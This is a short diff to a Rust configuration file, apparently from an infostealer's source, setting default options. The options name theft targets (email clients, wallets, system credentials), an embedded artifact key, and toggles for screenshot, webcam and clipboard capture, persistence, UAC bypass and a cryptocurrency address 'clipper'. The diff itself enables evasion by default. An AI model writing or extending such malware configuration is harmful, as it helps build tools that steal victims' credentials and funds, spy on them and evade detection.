@@ -6,14 +6,16 @@ pub static DEFAULT_ALLOWED_CATEGORIES: Option<&[RecoveryCategory]> = Some(&[
     RecoveryCategory::EmailClients,
     RecoveryCategory::Wallets,
     RecoveryCategory::System,
-    RecoveryCategory::Other
+    RecoveryCategory::Other,
 ]);
-pub static DEFAULT_ARTIFACT_KEY: Option<&str> = Some("CSAUKAXurU5lMsYkMn8kbjLfdDHtmQam8zNKJA7R6oQ=");
+pub static DEFAULT_ARTIFACT_KEY: Option<&str> =
+    Some("CSAUKAXurU5lMsYkMn8kbjLfdDHtmQam8zNKJA7R6oQ=");
 pub static DEFAULT_CAPTURE_SCREENSHOTS: bool = false;
 pub static DEFAULT_CAPTURE_WEBCAMS: bool = false;
 pub static DEFAULT_CAPTURE_CLIPBOARD: bool = false;
 pub static DEFAULT_PERSISTENCE: bool = false;
 pub static DEFAULT_UAC_BYPASS: bool = false;
+pub static DEFAULT_EVASION_ENABLED: bool = true;
 pub static DEFAULT_CLIPPER_ENABLED: bool = false;
 pub static DEFAULT_BTC_ADDRESS: Option<&str> = None;
 pub static DEFAULT_ETH_ADDRESS: Option<&str> = None;
